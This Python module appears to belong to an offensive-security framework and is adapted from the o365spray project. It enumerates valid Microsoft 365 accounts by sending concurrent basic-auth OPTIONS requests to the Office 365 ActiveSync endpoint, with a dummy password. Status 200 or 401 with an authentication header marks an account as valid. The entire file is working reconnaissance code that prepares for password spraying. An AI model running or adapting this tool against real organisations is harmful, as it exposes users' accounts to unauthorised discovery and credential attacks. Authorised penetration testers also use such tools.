#!/usr/bin/env python3

import time
import logging
import urllib3
import asyncio
import requests
import concurrent.futures
import concurrent.futures.thread
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from functools import partial
from core.utils import *
from core.colors import text_colors
from core.defaults import *
from requests.auth import HTTPBasicAuth

class ASModule(object):

    # Storage for successful results of each task
    successful_results = []

    def __init__(self, *args, **kwargs):
        self.type     = "enum"
        self.args     = kwargs['args']
        self.loop     = kwargs['loop']
        self.out_dir  = kwargs['out_dir']
        self.executor = concurrent.futures.ThreadPoolExecutor(
            max_workers=self.args.rate
        )
        self.proxies  = None if not self.args.proxy else {
            "http": self.args.proxy, "https": self.args.proxy
        }
        # Open file handles for logging and writing test cases
        self.log_file = ThreadWriter(LOG_FILE, kwargs['log_dir'])

    def shutdown(self, key=False):
        ''' Perform a shutdown and clean up of the asynchronous handler '''
        print()  # Print empty line
        if key:
            logging.warning("CTRL-C caught...")
        logging.info(f"Writing results to: '{self.out_dir}'")

        # https://stackoverflow.com/a/48351410
        # https://gist.github.com/yeraydiazdiaz/b8c059c6dcfaf3255c65806de39175a7
        # Unregister _python_exit while using asyncio
        # Shutdown ThreadPoolExecutor and do not wait for current work
        import atexit
        atexit.unregister(concurrent.futures.thread._python_exit)
        self.executor.shutdown = lambda wait:None

        # Write the successful results
        with open(f"{self.out_dir}{ENUM_FILE}", 'a') as f:
            write_data(self.successful_results, f)

        # Close the open file handles
        self.log_file.close()

    async def run(self, users, password='password'):
        ''' Asyncronously execute task(s) '''
        blocking_tasks = [
            self.loop.run_in_executor(
                self.executor, partial(self._execute,
                                       user=user,
                                       password=password)
            )
            for user in users
        ]
        if blocking_tasks:
            await asyncio.wait(blocking_tasks)

    def _execute(self, user, password):
        ''' Perform an asynchronous task '''
        try:
            time.sleep(0.250)

            # --------------------------------------------------------
            # For new modules, modify the below code block logic

            # Via: https://github.com/0xZDH/o365spray/blob/master/core/handlers/enumerator.py#L107
            ''' Enumerate users on Microsoft using Microsoft Server ActiveSync
                Original enumeration via: https://bitbucket.org/grimhacker/office365userenum/ '''

            # Add special header for ActiveSync
            custom_headers = HTTP_HEADERS
            custom_headers["MS-ASProtocolVersion"] = "14.0"

            # Build/validate email
            if self.args.domain:
                user = build_email(user, self.args.domain)

            elif not check_email(user):
                logging.error(f"Invalid user: {user}")
                return

            # Perform OPTIONS request
            auth      = HTTPBasicAuth(user, password)
            url       = "https://outlook.office365.com/Microsoft-Server-ActiveSync"
            response  = self._send_request(requests.options,
                                           url,
                                           auth=auth,
                                           headers=custom_headers)

            r_status  = response.status_code
            r_headers = response.headers

            # Validate HTTP response status
            if r_status == 200:
                self.successful_results.append(user)
                logging.info(f"{text_colors.green}[ + ]{text_colors.reset} {user}")

            # Note: After the new MS updates, it appears that invalid users return a 403 Forbidden while valid users
            #       appear to respond with 401 Unauthorized with a WWW-Authenticate response header that indicates
            #       Basic auth negotiation was started
            elif r_status == 401 and "WWW-Authenticate" in r_headers.keys():
                self.successful_results.append(user)
                logging.info(f"{text_colors.green}[ + ]{text_colors.reset} {user}")

            else:
                print(f"{text_colors.red}[ - ]{text_colors.reset} {user}{gen_space(user)}", end='\r')

            # End template module code block logic.
            # --------------------------------------------------------

        except Exception as e:
            logging.debug(e)
            pass

    def _send_request(self, request, url, auth=None, data=None, json=None,
                      headers=HTTP_HEADERS, allow_redirects=False):
        ''' Template for HTTP Requests '''
        return request(url,
                       auth=auth,
                       data=data,
                       json=json,
                       headers=headers,
                       proxies=self.proxies,
                       timeout=self.args.timeout,
                       allow_redirects=allow_redirects,
                       verify=False)
